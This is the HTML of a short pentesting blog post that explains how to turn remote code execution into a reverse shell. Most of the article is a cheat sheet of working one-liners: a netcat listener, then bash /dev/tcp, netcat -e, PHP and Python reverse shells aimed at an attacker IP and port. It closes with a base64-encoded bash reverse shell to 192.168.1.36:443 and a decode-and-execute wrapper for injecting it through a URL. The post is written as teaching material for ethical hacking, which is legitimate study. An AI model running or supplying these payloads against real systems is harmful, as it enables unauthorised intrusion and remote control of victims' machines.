<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Get reverse shell with RCE | AbusingLinux</title>
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="Get reverse shell with RCE" />
<meta name="author" content="isuckatlinux" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Introduction" />
<meta property="og:description" content="Introduction" />
<link rel="canonical" href="https://abusinglinux.com//2022/02/03/get-reverse-shell-with-rce.html" />
<meta property="og:url" content="https://abusinglinux.com//2022/02/03/get-reverse-shell-with-rce.html" />
<meta property="og:site_name" content="AbusingLinux" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-02-03T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Get reverse shell with RCE" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"isuckatlinux"},"dateModified":"2022-02-03T00:00:00+00:00","datePublished":"2022-02-03T00:00:00+00:00","description":"Introduction","headline":"Get reverse shell with RCE","mainEntityOfPage":{"@type":"WebPage","@id":"https://abusinglinux.com//2022/02/03/get-reverse-shell-with-rce.html"},"url":"https://abusinglinux.com//2022/02/03/get-reverse-shell-with-rce.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://abusinglinux.com//feed.xml" title="AbusingLinux" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">AbusingLinux<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
        
        <a class="color-cyan-hover" href="https://twitter.com/ISuckAtLinuxxx"><i class="fab fa-twitter-square"></i></a>
        
        
        
        <a class="color-purple-hover" href="https://github.com/isuckatlinux"><i class="fab fa-github-square"></i></a>
        
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">


<img src="
    /assets/linux.gif
" class="author-avatar" alt="Avatar" />
<div class="description">Hi, Im Pedro García a cybersecurity and ethical hacking learner. I will be sharing on this web site all my knowledge of these particular arts. I hope you enjoy this blog as much as I do writting all this! <3
</div>

</div>


<div class="post">
  <h1 class="post-title">Get reverse shell with RCE</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/reverse-shell/">reverse-shell</a>
      
      <a class="tag" href="/tag/pentest-basics/">pentest-basics</a>
      
      <a class="tag" href="/tag/rce/">rce</a>
      
  </div>
  
  <div class="post-date">Published on 03 Feb 2022</div>
  
  <h2 id="introduction">Introduction</h2>

<p>When we are triying to pwn a machine we look for a shell connected to the victim’s machine. Sometimes we can found some credentiales or RSA keys to connect via SSH. More times we can’t get a SSH shell but we have some <a href="https://www.n-able.com/blog/remote-code-execution">RCE</a>.
In this article we are going to cover different ways to get a reverse shell with <a href="https://www.n-able.com/blog/remote-code-execution">RCE</a></p>

<p>Soon, in later articles we are going to be covering how to upgrade these shell’s because these are not interactive, means, for example, that if we press TAB we won’t get an autocompletion, we will just get a tabulation.</p>

<p>Also, a good practice before try to connect a reverse shell is try to test this RCE first create the shell.
In this <a href="https://www.abusinglinux.com/2022/02/04/test-rce.html">article</a> we cover how to test this.</p>

<p>For the porpous of this post we are going to be using an Ubuntu FocalFossa machine from <a href="https://www.osboxes.org/">osboxes.org </a></p>

<h3 id="getting-an-interactive-reverse-shell-with-socat">Getting an interactive reverse shell with socat</h3>
<p>In this <a href="https://www.abusinglinux.com/2022/02/11/get-full-interactive-reverse-shell-with-socat.html">post</a> we cover how to get an interactive reverse shell with socat</p>

<h2 id="concepts-and-notation">Concepts and notation</h2>
<p>In order to follow this post we have to make clear some concpets and notation.
When we say $IP we mean the ip address of the attacker’s machine. You can choose any port for $PORT, just remember have to be a number between 1 and 65,535. Also the port have to be free, no service have to be running. A common port used to reverse shell is 443</p>

<h2 id="from-attackers-machine">From attacker’s machine</h2>
<p>In most of the cases we are going to use netcat in order to listen to the comunication
This will be the only command we execute in our attacker’s machine, the rest of them will be executed on the victim’s machine.</p>

<p>We have to run:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> <span class="nv">$PORT</span>
</code></pre></div></div>
<p>With this command we are going to be waiting for connecions at this port in our machine.</p>

<h2 id="from-victims-machine">From victim’s machine</h2>
<p>The command that we have to inject are one of those:</p>

<h3 id="bash">Bash</h3>

<p>This is propably the easiest way to do it.
We have to enter this command in the victim’s machine</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/<span class="nv">$IP</span>/<span class="nv">$PORT</span> 0&gt;&amp;1
</code></pre></div></div>

<h3 id="netcat">Netcat</h3>

<p>If netcat is installed in the victmim’s machine we can also got a reverse shell</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nv</span> <span class="nv">$IP</span> <span class="nv">$PORT</span> <span class="nt">-e</span> /bin/sh
nc <span class="nt">-nv</span> <span class="nv">$IP</span> <span class="nv">$PORT</span> <span class="nt">-e</span> /bin/bash
</code></pre></div></div>
<p>Either of this two commands will work.</p>

<h3 id="php">PHP</h3>

<p>If we have php installed on the victim’s machine we can:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">php</span> <span class="o">-</span><span class="n">r</span> <span class="s1">'$sock=fsockopen("$IP",$PORT);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
</code></pre></div></div>

<h3 id="python">Python</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
</code></pre></div></div>

<h2 id="special-cases">Special cases</h2>
<p>We just saw a few ways to get a reverse shell but sometimes we have to inject the code on an url. So there’s a problem because if we try to inject the bash code we can see that there is some special characters that the web would recognize like /. We wan’t to pass that command as a string, so the web can’t recognize that characters.</p>

<h3 id="encode-to-base64">Encode to base64</h3>
<p>First we have encode the command to base64.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nv">$command_to_convet</span> | <span class="nb">base64</span>
</code></pre></div></div>
<p>For example we are going to convert:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/192.168.1.36/443 0&gt;&amp;1
</code></pre></div></div>
<p>The result:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMzYvNDQzIDA+JjEK
</code></pre></div></div>
<p>We notice that now we dont have those special characters that were bothering us, but now we have another problem.
We can’t just pass this encode string and expect the victim’s machine to recognize IT.</p>

<p>So we have to tell it how to decode and execute, THIS IS THE FINAL URL COMMAND THAT WE HAVE TO INJECT:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nv">$encode_string</span>|base64 <span class="nt">-d</span>|bash
</code></pre></div></div>
<p>We just to put the previusly encoded string into the $encode_string variable</p>


</div>


<div class="comments">
<div id="disqus_thread"></div>
<script>
 var disqus_config = function () {
     this.page.url = 'https://abusinglinux.com//2022/02/03/get-reverse-shell-with-rce.html';
     this.page.identifier = '/2022/02/03/get-reverse-shell-with-rce';
     this.page.title = 'Get reverse shell with RCE';
 };

 (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
     var d = document, s = d.createElement('script');

     s.src = '//https://abusinglinux.com/.disqus.com/embed.js';

     s.setAttribute('data-timestamp', +new Date());
     (d.head || d.body).appendChild(s);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2022/09/07/backdoor-htb-writeup.html">
            Backdoor HTB WriteUp
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2022/07/07/storing-api-credentials-in-Python.html">
            Storing API credentials on Python
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2022/02/11/get-full-interactive-reverse-shell-with-socat.html">
            Get Full Interactive reverse Shell With Socat
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/python/" class="set-1">Python</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/eternal-blue/" class="set-1">eternal-blue</a> <a href="/tag/good-practice/" class="set-1">good-practice</a> <a href="/tag/hackthebox/" class="set-5">hackthebox</a> <a href="/tag/moodle/" class="set-1">moodle</a> <a href="/tag/nosqlinyection/" class="set-1">nosqlinyection</a> <a href="/tag/parrot/" class="set-1">parrot</a> <a href="/tag/pentest-basics/" class="set-2">pentest-basics</a> <a href="/tag/python2/" class="set-1">python2</a> <a href="/tag/rce/" class="set-4">rce</a> <a href="/tag/reverse-shell/" class="set-4">reverse-shell</a> <a href="/tag/screen/" class="set-1">screen</a> <a href="/tag/socat/" class="set-1">socat</a> <a href="/tag/wordpress/" class="set-1">wordpress</a> <a href="/tag/writeup/" class="set-4">writeup</a></div>
  




<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();

  // Image modal
  var $imgs = [];
  $('img').each(function(idx) {
    var obj = {
      src: $(this).attr('src')
    }
    $imgs.push(obj);
    var elem = $(this);
    $(this).click(function() {
      $('.modal').magnificPopup('open', idx);
    });
  });

  $('.modal').magnificPopup({
    items: $imgs,
    type: 'image',
    closeOnContentClick: true,
    mainClass: 'mfp-img-mobile',
    image: {
      verticalFit: true
    }
    
  });
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
